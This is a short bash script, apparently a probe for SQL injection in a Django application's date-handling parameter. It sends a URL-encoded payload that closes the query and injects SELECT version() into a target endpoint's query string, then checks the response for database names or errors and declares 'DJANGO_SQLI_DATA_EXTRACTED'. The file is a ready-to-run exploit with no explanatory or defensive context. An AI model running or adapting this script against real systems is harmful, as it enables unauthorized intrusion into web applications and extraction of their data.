#!/bin/bash
set -euo pipefail

ENDPOINT="${1:?Usage: $0 <ENDPOINT>}"
PARAM="${2:-date}"

echo "=== 备用提取 ==="
resp=$(curl -s "${ENDPOINT}/?${PARAM}=year%27%2C(SELECT%20version()))--%20" --max-time 15 2>/dev/null)
echo "$resp"
if echo "$resp" | grep -qi "PostgreSQL\|MySQL\|SQLite\|invalid\|error"; then
  echo "DJANGO_SQLI_DATA_EXTRACTED"
fi
